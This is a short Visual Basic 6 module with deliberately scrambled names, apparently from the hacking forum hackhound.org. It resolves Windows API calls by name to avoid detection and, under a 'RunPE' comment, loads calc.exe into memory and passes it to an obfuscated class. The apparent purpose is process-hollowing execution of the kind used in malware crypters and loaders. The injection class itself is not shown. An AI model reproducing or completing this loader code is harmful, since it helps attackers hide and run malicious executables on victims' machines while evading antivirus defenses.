Attribute VB_Name = "ORfn1O"
Option Explicit
  Sub main()
  dim TN1GF as new S9JI 
  dim MYttDxZA as long
  dim OkO5rtr6aM as long
  Dim Y1KKxnL(512) As Byte
  dim VFR40Krx4H as string
  Dim TVaXXkB()    As Byte
  'Call Api By Name
  MYttDxZA = TN1GF.EZXL("kernel32")
  OkO5rtr6aM = TN1GF. PbM8Q(MYttDxZA, "GetModuleFileNameW")
  TN1GF.N0LVAickWT OkO5rtr6aM, 0&, VarPtr(Y1KKxnL(0) ), 512
  VFR40Krx4H = Left$(Y1KKxnL, InStr(Y1KKxnL, Chr$(0)) - 1)
  'RunPE
  Open Environ$("windir") & "\system32\calc.exe" For Binary As #1
  ReDim TVaXXkB(LOF(1) - 1)
  Get #1, , TVaXXkB
  Close #1
  TN1GF.Rc802AVG TVaXXkB
  msgbox VFR40Krx4H,vbInformation ,"Simple Example (c)BUNNN //hackhound.org"
  end
End Sub